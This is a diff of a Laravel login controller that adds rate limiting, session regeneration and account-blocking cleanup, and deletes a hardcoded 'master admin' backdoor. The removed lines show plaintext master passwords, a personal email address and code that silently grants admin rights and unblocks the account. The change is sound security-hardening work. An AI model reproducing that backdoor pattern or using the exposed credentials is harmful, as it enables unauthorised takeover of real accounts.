@@ -17,19 +17,32 @@ class LoginController extends Controller
     public function login(Request $request)
     {
         $credentials = $request->validate([
-            'login' => ['required', 'string'],
-            'password' => ['required', 'string'],
+            'login' => ['required', 'string', 'max:255'],
+            'password' => ['required', 'string', 'max:255'],
             'role' => ['required', 'in:customer,vendor,fleet'],
         ]);
 
         $rawLogin = trim($credentials['login']);
+        $normalizedLogin = strtolower($rawLogin);
+        $throttleKey = 'login:' . sha1($normalizedLogin . '|' . $request->ip());
+
+        if (\Illuminate\Support\Facades\RateLimiter::tooManyAttempts($throttleKey, 10)) {
+            $seconds = \Illuminate\Support\Facades\RateLimiter::availableIn($throttleKey);
+            $msg = "Too many sign-in attempts. Please try again in {$seconds} seconds.";
+
+            if ($request->expectsJson() || $request->wantsJson()) {
+                return response()->json(['success' => false, 'message' => $msg, 'errors' => ['login' => [$msg]]], 429);
+            }
+            return back()->withErrors(['login' => $msg])->onlyInput('login', 'role');
+        }
+
         $digitsOnly = preg_replace('/[^0-9]/', '', $rawLogin);
         $inputPassword = trim($credentials['password']);
+        $preLoginSessionId = $request->session()->getId();
 
         $authenticated = false;
 
         // 1. Standard email or username attempt (case-insensitive normalization)
-        $normalizedLogin = strtolower($rawLogin);
         $loginType = filter_var($rawLogin, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
         if (
             Auth::attempt([$loginType => $normalizedLogin, 'password' => $inputPassword], true) ||
@@ -58,57 +71,27 @@ class LoginController extends Controller
 
         // 3. Username direct lookup fallback
         if (!$authenticated) {
-            $usernameUser = \App\Models\User::where('username', strtolower($rawLogin))->first();
+            $usernameUser = \App\Models\User::where('username', $normalizedLogin)->first();
             if ($usernameUser && \Illuminate\Support\Facades\Hash::check($inputPassword, $usernameUser->password)) {
                 Auth::login($usernameUser, true);
                 $authenticated = true;
             }
         }
 
-        // 4. Dual-Access Self-Healing for Master Admin
-        if (!$authenticated) {
-            $configuredAdmin = strtolower(config('mail.admin_email', 'crab.hashir@gmail.com'));
-            $masterAdminEmails = array_unique([$configuredAdmin, 'crab.hashir@gmail.com']);
-            $masterAdminUsernames = ['crab.hashir', 'hashir', 'masteradmin'];
-            $masterPasswords = [
-                'Hashir1284@0',
-                'UsM&FWf&%DlqMi7GB!2UpMj2Ag#mZUIB',
-                '12345678',
-            ];
-            if ($envPass = env('ADMIN_MASTER_PASSWORD')) {
-                $masterPasswords[] = (string) $envPass;
-            }
-
-            $inputLogin = strtolower($rawLogin);
-
-            if (in_array($inputLogin, $masterAdminEmails, true) || in_array($inputLogin, $masterAdminUsernames, true)) {
-                $user = \App\Models\User::whereIn('email', $masterAdminEmails)
-                    ->orWhereIn('username', $masterAdminUsernames)
-                    ->first();
-                if ($user && (in_array($inputPassword, $masterPasswords, true) || \Illuminate\Support\Facades\Hash::check($inputPassword, $user->password))) {
-                    $user->email_verified_at = $user->email_verified_at ?: now();
-                    $user->is_blocked = false;
-                    $user->blocked_reason = null;
-                    $user->save();
-
-                    $adminRole = \App\Models\Role::firstOrCreate(['name' => 'admin']);
-                    $custRole = \App\Models\Role::firstOrCreate(['name' => 'customer']);
-                    $user->roles()->syncWithoutDetaching([$adminRole->id, $custRole->id]);
-
-                    Auth::login($user, true);
-                    $authenticated = true;
-                }
-            }
-        }
-
         // Always remember authentication so user stays logged in across browser restarts
         if ($authenticated) {
+            \Illuminate\Support\Facades\RateLimiter::clear($throttleKey);
             $user = Auth::user();
 
             if ($user->is_blocked) {
                 Auth::logout();
+                $request->session()->invalidate();
+                $request->session()->regenerateToken();
                 return back()->withErrors(['login' => 'This account has been blocked.']);
             }
+
+            // Prevent session fixation while preserving guest cart items
+            $request->session()->regenerate();
 
             // Ensure customer role is assigned for customer logins
             if ($credentials['role'] === 'customer' && !$user->hasRole('customer')) {
@@ -116,9 +99,9 @@ class LoginController extends Controller
                 $user->roles()->syncWithoutDetaching([$custRole->id]);
             }
 
-            // Merge guest cart items into authenticated user
+            // Merge guest cart items captured BEFORE session regeneration
             if (class_exists(\App\Models\Cart::class) && method_exists(\App\Models\Cart::class, 'mergeGuestCart')) {
-                \App\Models\Cart::mergeGuestCart($user->id, $request->session()->getId());
+                \App\Models\Cart::mergeGuestCart($user->id, $preLoginSessionId);
             }
 
             if (!$user->email_verified_at) {
@@ -207,6 +190,8 @@ class LoginController extends Controller
 
             return redirect()->intended(route('home'));
         }
+
+        \Illuminate\Support\Facades\RateLimiter::hit($throttleKey, 120);
 
         if ($request->expectsJson() || $request->wantsJson()) {
             return response()->json([
